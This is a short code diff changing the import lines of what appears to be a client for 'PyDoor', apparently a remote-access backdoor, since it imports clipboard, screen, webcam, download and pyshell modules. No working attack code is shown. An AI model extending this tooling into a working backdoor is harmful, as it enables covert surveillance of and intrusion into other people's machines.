@@ -1,11 +1,9 @@
 """ PyDoor Client """
 import json
 import logging
-import threading
 import subprocess
 import queue
-from contextlib import redirect_stdout, suppress
-from io import StringIO
+from contextlib import suppress
 
 from cryptography.hazmat.primitives.asymmetric import ec
 from modules import clipboard, download, screen, webcam, windows, pyshell
